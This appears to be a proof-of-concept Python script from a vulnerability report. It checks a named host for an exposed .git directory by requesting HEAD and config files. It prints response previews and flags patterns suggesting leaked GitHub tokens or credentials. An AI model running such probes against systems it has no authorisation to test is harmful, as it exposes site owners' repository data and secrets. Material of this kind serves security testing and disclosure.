# ============================================================
# Author: Pedro Souza
# Vulnerability: Exposed .git repository with credential leak
# Target: git.0x10.cloud
# ============================================================

import urllib.request
import urllib.error
import time

TARGET = "http://git.0x10.cloud"
PATHS = [
    "/.git/",
    "/.git/HEAD",
    "/.git/config"
]

def fetch_url(url):
    try:
        response = urllib.request.urlopen(url, timeout=5)
        body = response.read().decode("utf-8", errors="replace")
        return response.status, body
    except urllib.error.HTTPError as e:
        return e.code, ""
    except Exception as e:
        print(f"Error accessing {url}: {e}")
        return None, ""

def main():
    print("Checking exposed Git repository files on git.0x10.cloud...\n")

    findings = 0

    for path in PATHS:
        url = TARGET + path
        status, body = fetch_url(url)

        print(f"Checking: {url}")
        print(f"Status: {status}")

        if status == 200:
            print("Accessible resource found.")
            findings += 1

            preview = body[:400].strip()
            if preview:
                print("Response preview:")
                print(preview)

            if path == "/.git/HEAD" and "refs/heads/" in body:
                print("VULNERABILITY: Exposed Git HEAD reveals the active branch.")

            if path == "/.git/config":
                print("VULNERABILITY: Exposed Git config reveals repository configuration.")

                lowered = body.lower()
                if "github.com" in lowered:
                    print("Sensitive detail found: remote GitHub repository disclosed.")

                if "ghp_" in body or "token" in lowered or "admin:" in body:
                    print("CRITICAL: Possible credentials or access token exposed in .git/config.")

        else:
            print("Not accessible.")

        print("-" * 60)
        time.sleep(0.2)

    print("\nScan complete.")

    if findings > 0:
        print("FINAL RESULT: Exposed .git repository data was detected.")
        print("Security risk: attackers may collect internal repository data and leaked credentials.")
    else:
        print("FINAL RESULT: No exposed .git files were confirmed.")

if __name__ == "__main__":
    main()